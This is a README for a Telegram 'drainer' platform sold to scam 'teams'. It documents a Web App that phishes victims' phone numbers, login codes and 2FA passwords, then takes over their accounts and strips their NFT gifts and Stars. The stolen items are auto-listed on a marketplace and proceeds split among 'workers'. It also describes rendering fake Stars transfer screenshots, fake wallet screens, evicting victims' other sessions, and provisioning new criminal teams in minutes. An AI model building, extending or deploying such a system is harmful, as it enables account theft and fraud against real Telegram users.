EN | [RU](docs/README_RU.md)

## telegram-april-drainer 📦

![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white)


**telegram-april-drainer** - multi-tenant Telegram platform with team auto-registration, marketplace sniper, check rendering, web admin panel, and full production stack.

Not "one bot" - this is a **team factory**: each team gets its own port, nginx location, config, storage, bot, and Web App. Autocraft registers a new team in a minute. Supervisor keeps everything alive. Receiver poll snipes listings on Tonnel.

**Core version:** 4.0.0

> Archive cleaned of secrets. Before running: `config.example.py` → `config.py`, `.env.example` → `.env`, `scripts/bootstrap_env.py --write`.

---

## 📑 Contents

- [Highlights](#-highlights)
- [Architecture](#-architecture)
- [Team system](#-team-system)
- [Autocraft - team auto-registration](#-autocraft---team-auto-registration)
- [Sniper and receiver poll](#-sniper-and-receiver-poll)
- [Checks and rendering](#-checks-and-rendering)
- [Admin panel](#-admin-panel)
- [Bot and workers](#-bot-and-workers)
- [Web App and d0sh1k](#-web-app-and-d0sh1k)
- [Monitoring and checker](#-monitoring-and-checker)
- [Quick start](#-quick-start)
- [Repository structure](#-repository-structure)
- [Environment variables](#-environment-variables)
- [Security](#-security)
- [License](#-license)

---

## ✨ Highlights

| Feature | What it does |
|------|------------|
| **Multi-team** | N teams on one server, isolated config + storage + ports |
| **Auto-registration** | Buy token → name → ready team with nginx and supervisor |
| **Sniper** | Auto-list NFT, relist by price steps, track sold, profit to worker |
| **Checks** | Inline `100 @user`, multichecks, fake Stars transfer screenshots via PIL |
| **Admin panel** | `/{team}/admin` - config, sessions, profits, proxies, product mode |
| **Product mode** | `checks` / `marker` - different product scenarios per team |
| **Referral** | Separate referral-web on its own port + landing with Telegram Login Widget |
| **Supervisor** | Health-check, autostart bot/web, `getMe` token verification |
| **Checker** | Cross-team watchdog + daily statistics in Telegram |

---

## 🏗️ Architecture

```mermaid
flowchart TB
    subgraph clients [Clients]
        USER[TG User]
        WORKER[Worker]
        ADMIN[Admin]
        BUYER[Team buyer]
    end

    subgraph edge [Edge]
        NGINX[nginx]
    end

    subgraph platform [Platform layer]
        AC[autocraft API + SPA]
        AC_BOT[autocraft bot]
        MON[server-monitor]
        CHECKER[checker.py]
    end

    subgraph teamA [Team goodteam]
        WEB_A[web.py :37018]
        BOT_A[bot.py]
        REF_A[web_referral.py :37019]
        CFG_A[config.py + storage/]
    end

    subgraph teamB [Team ...]
        WEB_B[web.py :37xxx]
        BOT_B[bot.py]
    end

    subgraph workers [Background workers]
        SUP[teams_supervisor]
        REC[receiver_poll]
        TONNEL[Tonnel / Fragment API]
    end

    subgraph ui [UI]
        D0SH[d0sh1k Node WebApp]
        ADMIN_UI["/{team}/admin"]
    end

    BUYER --> AC
    AC -->|provision_team| teamA
    AC -->|nginx include| NGINX

    USER --> NGINX
    WORKER --> BOT_A
    ADMIN --> ADMIN_UI

    NGINX --> WEB_A
    NGINX --> REF_A
    NGINX --> AC
    NGINX --> MON
    NGINX --> D0SH

    WEB_A --> CFG_A
    BOT_A --> CFG_A
    SUP --> WEB_A
    SUP --> BOT_A
    SUP --> teamB

    REC --> TONNEL
    REC --> CFG_A
    CHECKER --> teamA
    CHECKER --> teamB
```

### Data flow (simplified)

```mermaid
sequenceDiagram
    participant U as User
    participant W as Web App
    participant P as Pyrogram
    participant B as Bot
    participant G as Work Group
    participant R as receiver_poll

    U->>W: open Web App (initData)
    W->>W: verify_telegram_data()
    W->>P: phone → code → 2FA
    P->>W: session ready
    W->>G: drain log
    R->>R: list NFT on Tonnel
    R->>R: poll sold / relist
    R->>B: profit notify worker
    B->>G: payout thread
```

---

## 👥 Team system

Each team is a **fully autonomous instance** in `teams/<slug>/`:

```
teams/goodteam/
├── config.py              # BOT_TOKEN, sessions, wallets, thread IDs
├── service.json           # web_port, referral_web_port, health_url, autostart
├── config.example.py      # template for new teams
└── storage/
    ├── settings.json      # privacy, photos, gift_upgrades
    ├── procents.json      # coefficients and worker %
    ├── config.json        # product_mode: checks | marker
    ├── banned.json
    ├── reserve.json       # reserve bot tokens
    ├── 2fa.json           # runtime cache (in .gitignore)
    ├── *.db               # gois, profits, checks, listing_gifts
    └── avatar.png         # for /draw
```

### Context-aware routing

`paths.py` holds `TEAM_DIR` via `contextvars`:

- env `TEAM_DIR` - for single-instance run
- `TeamPathMiddleware` - for admin at `https://host/goodteam/admin`
- `push_team_dir()` / `pop_team_dir()` - switch on the fly

One `code/` codebase, dozens of teams - no repository forks.

### service.json

```json
{
  "web_port": 37018,
  "referral_web_port": 37019,
  "web_host": "127.0.0.1",
  "health_url": "http://127.0.0.1:37018/",
  "check_interval_sec": 30,
  "autostart_bot": true
}
```

Supervisor reads this file and starts `web.py` + `bot.py` on the required ports.

### Nginx per team

Autocraft writes include files:

```
autocraft/nginx-generated/
├── fragment/goodteam.conf    # proxy_pass → web_port
└── referral/goodteam.conf    # proxy_pass → referral_web_port
```

Public URL: `https://1.fragmentapi.online/goodteam/`

---

## 🏭 Autocraft - team auto-registration

**Autocraft** - control plane of the entire stack. React frontend + FastAPI backend.

### Registering a new team

```mermaid
sequenceDiagram
    participant A as Admin
    participant AC as autocraft API
    participant DB as SQLite
    participant T as teams/test template
    participant N as nginx

    A->>AC: POST /api/internal/tokens
    AC->>DB: create 16-char token
    AC-->>A: url /r/{token}

    Note over A: Buyer opens /r/{token}

    A->>AC: POST /api/register/finish
    Note right of A: team_name, password
    AC->>T: copytree → teams/{slug}
    AC->>AC: pick_free_port × 2
    AC->>AC: render config.py
    AC->>N: write fragment + referral conf
    AC->>AC: systemctl restart supervisor
    AC->>DB: mark token used
```

### What `provision_team()` does

1. Copies `teams/test` (or `TEMPLATE_TEAM_SLUG`) to `teams/{slug}`
2. Cleans `storage/*.db` from the template
3. Generates `config.py`: `WEB_APP_LINK`, `SECRET_KEY` (admin password), empty tokens
4. Allocates **two free ports** from range `37000-37899`
5. Writes `service.json`
6. Generates nginx snippets + `reload_host_nginx.sh`
7. Restarts `teams_supervisor`

### API

| Endpoint | Description |
|----------|----------|
| `POST /api/internal/tokens` | Create one-time registration token |
| `GET /api/register/status/{token}` | Is token valid? |
| `POST /api/register/finish` | Finish registration (rate limit 8/min) |
| `GET /api/health` | Healthcheck |

Tokens live `TOKEN_TTL_HOURS`, single-use.

---

## 🎯 Sniper and receiver poll

**`receiver_poll.py`** - background marketplace worker. This is the "sniper": automatically lists gifts/NFT on Tonnel, tracks sales, adjusts price, calculates profit.

### Features

- **Auto-listing** - new gifts from drain → on sale
- **Relist ladder** - multipliers `0.9 → 0.8 → 0.7 → 0.6` (`RECEIVER_LIST_PRICE_MULTS`)
- **Floor tracking** - `gift_floor()` + `tonnel_floor_withdraw_loop.py`
- **Sold detection** - polling every `RECEIVER_POLL_INTERVAL_SEC`
- **Profit split** - linked to `worker_id`, `profit_id`, `listing_gifts` in SQLite
- **Worker DM** - `listing_price_pending` with inline price selection buttons
- **Auto-withdraw** - 78% of balance to wallet after sale
- **Rate limit cooldown** - protection from Coffin API throttling

### Config (env)

```bash
RECEIVER_POLL_ENABLED=1
RECEIVER_AUTO_SELL_ENABLED=0      # polling only vs full auto-sell
RECEIVER_POLL_INTERVAL_SEC=10
RECEIVER_LISTING_TTL_SEC=600
RECEIVER_LIST_PRICE_MULTS=0.9,0.8,0.7,0.6
RECEIVER_LIST_PRICE_FLOOR_MULT=0.6
RECEIVER_POLL_LOG_BOT_TOKEN=
RECEIVER_POLL_LOG_CHAT_ID=
```

### Related modules

| File | Role |
|------|------|
| `listing_price_pending.py` | Pending listings + inline keyboard |
| `handlers/receiver_listing.py` | Price selection callback |
| `handlers/gift_list_price.py` | Worker price FSM |
| `tonnel_withdraw_all.py` | One-time balance withdrawal |
| `tonnel_floor_withdraw_loop.py` | list → sell → withdraw loop by floor |
| `drainer/core/tonnel_api.py` | Coffin API, balance, list, cancel |

```mermaid
stateDiagram-v2
    [*] --> NewGift: drain received NFT
    NewGift --> Listed: coffin_list_for_sale
    Listed --> Polling: receiver_poll tick
    Polling --> Sold: gift gone + price
    Polling --> Relist: TTL expired
    Relist --> Listed: price × mult
    Sold --> Profit: advanced_profits + notify
    Sold --> Withdraw: 78% → wallet
    Profit --> [*]
```

---

## 💳 Checks and rendering

Two product modes (`storage/config.json` → `product_mode`):

- **`checks`** - star checks (primary)
- **`marker`** - alternative scenario

### Inline checks (worker)

Worker writes in bot inline mode:

| Query | Result |
|--------|-----------|
| `100 @username` | Check for 100 ⭐️ to @username |
| `100 50` | Multicheck: 100 ⭐️ × 50 activations |
| empty | Referral invite |

Restrictions:
- multicheck only **50 / 100 / 500** ⭐️
- new accounts - **21 day** cooldown
- membership check in `WORK_GROUP_ID`

Activation: `t.me/bot?start={check_id}_{worker_id}` → "checking…" animation → Web App wallet.

### Screenshot rendering - `draw.py`

PIL render of **fake Stars transfer screenshot** in Telegram style:

- background `static/background.png`
- device time (Europe/Moscow)
- worker avatar `teams/.../avatar.png`
- Stars amount with green `+ N`
- bot name, transaction date

Worker command:

```
/draw 50
```

→ `generate_image()` → `send_photo` → delete temp file.

Used for visuals in chats and logs.

### Checks database

```sql
checks       - id, stars, receiver, activated, worker_id
multichecks  - id, stars, activations, remaining
```

---

## 🛠️ Admin panel

**URL:** `https://host/{team}/admin`  
**Stack:** FastAPI + Jinja + WebGL background (shader in `admin.html`)

### Multi-team routing

`web_admin_app.py` → `TeamPathMiddleware`:

```
/goodteam/admin        → config goodteam
/test/admin            → config test
/goodteam/admin/api/…  → API with TEAM_DIR context
```

Cookie `pass` = SHA256(`SECRET_KEY`), path-scoped per team.

### Panels

| Section | Features |
|--------|-------------|
| **Config** | Edit `config.py` from browser, save + restart |
| **Product mode** | Switch `checks` ↔ `marker` |
| **Reserve tokens** | Reserve BOT_TOKEN for rotation |
| **Sessions** | Scan `.session`, phone/2FA, kick, export string |
| **Profits** | List, confirm, payout, worker % |
| **Proxy** | Edit `proxys.json`, switch active |
| **Pyrofork** | Install Pyrogram version from admin |
| **Add session** | Import new StringSession with 2FA |

### Telegram admin (bot)

`handlers/admins.py` - mobile mirror:

- `/admin` - main panel
- `/sessions` - session scan with progress bar
- `/draw N` - check rendering
- `/stat`, `/top`, `/profit` - analytics
- inline: hide mamonts/workers, toggle photos, gift upgrades
- FSM: change wallet, coefficients, phone, 2FA

---

## 🤖 Bot and workers

**aiogram 3** + **Pyrogram** in one process.

### Roles

```mermaid
flowchart LR
    MAMONT[Mamont] -->|/start check_| BOT
    WORKER[Worker] -->|inline check| BOT
    ADMIN[Admin] -->|/admin| BOT
    BOT --> DB[(SQLite)]
    BOT --> GROUP[Work Group threads]
```

### Group threads

| Thread | Content |
|--------|------------|
| `LOGS_THREAD_ID` | Mamont logs, checks, multichecks |
| `DRAINS_THREAD_ID` | Successful drains |
| `PAYOUTS_THREAD_ID` | Worker payouts |

### Worker features

- **Wallet / shop / top-up** - fake UI for Stars
- **Auto-buyer** - `autobuy` toggle, notification about new gifts
- **Profits** - `advanced_profits.db`, `/profit`, payout panel
- **Privacy** - `privacy` / `worker_privacy` mask IDs in logs
- **Referral** - `referral_invites`, `referral_visits`, invite chosen

### Drainer core

```
code/drainer/core/
├── steal.py              # main pipeline after login
├── parse.py              # NFT valuation (xgift + proxy)
├── tonnel_api.py         # Coffin / Tonnel HTTP API
├── hybr1d_shared.py      # shared receiver session
├── kick_sessions.py      # reset foreign sessions
├── post_connect_captcha.py
├── coffin_signing.py
└── functional.py         # mutate_text, obfuscation
```

---

## 🌐 Web App and d0sh1k

### `web.py` (FastAPI)

| Route | Description |
|-------|----------|
| `/app` | Telegram Web App shell |
| `/code` | SMS code input |
| `/password` | 2FA |
| `/deposit`, `/withdraw` | Wallet UI |
| `/api/...` | initData, session state |

`initData` validation via HMAC-SHA256 (`verify_telegram_data`).  
Cookie drain-flow with error cooldown (`ERROR_COOLDOWN_SECONDS`).

### `web_referral.py`

Separate process on `referral_web_port`:

- landing `referral_landing.html` with WebGL shader
- Telegram Login Widget verification
- `referral_visits` tracking by `id{visitor}`

### `d0sh1k/`

Node.js bundle - alternative **chat UI Web App** (`TELEGRAM_WEB_APP_URL`).  
Runs as `opt-d0sh1k.service` in the shared stack.

---

## 📊 Monitoring and checker

### `teams_supervisor.py`

- iterates all `teams/*/service.json`
- HTTP health on `health_url`
- checks `getMe` for `BOT_TOKEN`
- autostart / restart `web.py` + `bot.py`
- logs in `teams/{slug}/logs/`

### `checker.py`

- cross-team process monitoring
- daily profit from `advanced_profits.db`
- notification at 22:00 MSK (`CHECKER_NOTIFY_*`)
- reserve token health

### `server-monitor/`

FastAPI dashboard:

- CPU, RAM, disk, load average
- systemd unit statuses of the stack
- login form (`MONITOR_USER` / `MONITOR_PASSWORD`)

---

## 🚀 Quick start

### 1. Secrets

```bash
cp teams/goodteam/config.example.py teams/goodteam/config.py
# BOT_TOKEN, API_ID, API_HASH, SESSION_STRING, wallets, ADMIN_ID



cp code/.env.example code/.env
cp autocraft/.env.example autocraft/.env
cp d0sh1k/.env.example d0sh1k/.env
cp server-monitor/env.sample server-monitor/.env

python3 scripts/bootstrap_env.py --write
```

### 2. Proxies

```bash
cp code/proxys.json.dist code/proxys.json
```

### 3. Single team (dev)

```bash
export TEAM_DIR="$(pwd)/teams/goodteam"
cd code
python3 -m venv .venv && .venv/bin/pip install -r requirements.txt

# web
.venv/bin/uvicorn web:app --host 127.0.0.1 --port 37018

# bot
.venv/bin/python bot.py

# admin (separate port)
.venv/bin/uvicorn web_admin_app:app --host 127.0.0.1 --port 37021

# receiver poll
.venv/bin/python receiver_poll.py
```

### 4. Full production stack

```bash
sudo deploy/install-ubuntu22.sh /opt
sudo systemctl restart opt-code-stack opt-autocraft-api opt-autocraft-bot opt-d0sh1k opt-server-monitor opt-receiver-poll
```

### 5. New team via Autocraft

```bash
# create token (internal API key in header)
curl -X POST http://127.0.0.1:9090/api/internal/tokens \
  -H "X-Internal-Key: $INTERNAL_API_KEY"

# buyer: https://byy.example.com/r/{token}
# enters name + password → team ready at /{slug}/
```

---

## 📁 Repository structure

```
.
├── code/                   # core: web, bot, drainer, receiver_poll, draw
│   ├── drainer/core/       # steal, tonnel, parse, hybr1d
│   ├── handlers/           # users, admins, gift_list_price, receiver_listing
│   ├── templates/          # web app, admin, referral landing
│   ├── draw.py             # PIL check rendering
│   ├── database.py         # SQLite: gois, profits, checks, listing_gifts
│   ├── teams_supervisor.py # watchdog for all teams
│   ├── checker.py          # cross-team checker
│   ├── receiver_poll.py    # Tonnel sniper
│   └── web_admin_app.py    # multi-team admin
│
├── teams/                  # team instances
│   ├── goodteam/
│   └── test/               # autocraft template
│
├── autocraft/              # auto-registration + nginx + panel
│   ├── backend/            # provision, tokens, nginx_writer
│   ├── frontend/           # React registration SPA
│   └── bot/                # admin notifications
│
├── d0sh1k/                 # Node Web App chat
├── server-monitor/         # server metrics
├── deploy/                 # install scripts, systemd, nginx
├── server-exports/         # prod nginx/systemd snapshot
├── server-pull/            # code backup copy
└── scripts/
    ├── bootstrap_env.py    # secret generation
    └── ssh_http_connect.py
```

---

## ⚙️ Environment variables

### `teams/*/config.py`

| Field | Purpose |
|------|------------|
| `BOT_TOKEN` | Team Telegram bot |
| `API_ID` / `API_HASH` | Pyrogram |
| `HYBR1D_SESSION_STRING` | Main StringSession |
| `STAR_SESSION_STRING` | Stars / auto top-up |
| `SECRET_KEY` | `/{team}/admin` password |
| `WEB_APP_LINK` | Public Web App URL |
| `ADMIN_WALLET` / `OFFERS_WALLET` | TON |
| `WORK_GROUP_ID` + thread IDs | Logs in supergroup |
| `REFERRAL_PUBLIC_BASE` | Referral landing base |

### `code/.env`

| Variable | Purpose |
|------------|------------|
| `WEB_SESSION_SECRET` | Web cookie |
| `ADMIN_SESSION_SECRET` | Admin cookie |
| `HELPER_BOT_TOKEN` | Helper bot |
| `CHECKER_NOTIFY_*` | Checker notifications |
| `XGIFT_PROXY` | Proxy for xgift price API |
| `WITHDRAW_WALLET` | Tonnel withdraw wallet |

### `autocraft/.env`

| Variable | Purpose |
|------------|------------|
| `INTERNAL_API_KEY` | Internal API protection |
| `TEAMS_ROOT` / `CODE_ROOT` | Paths |
| `PORT_RANGE_MIN/MAX` | Port range |
| `TEMPLATE_TEAM_SLUG` | Template (`test`) |
| `BUY_PUBLIC_BASE` | Team purchase URL |

---

## 🔒 Security

- **Do not commit:** `.env`, filled `config.py`, `2fa.json`, `*.session`, logs
- Archive **cleaned**: tokens, sessions, proxies, wallets, 2FA passwords removed
- If old secrets remain anywhere - **rotate everything**
- `server-exports/` - reference only, do not deploy without review
- `logs/` (~27 MB in goodteam) - local only, not in git

---

## 📜 License

Archive for studying and restoring **your own** infrastructure.
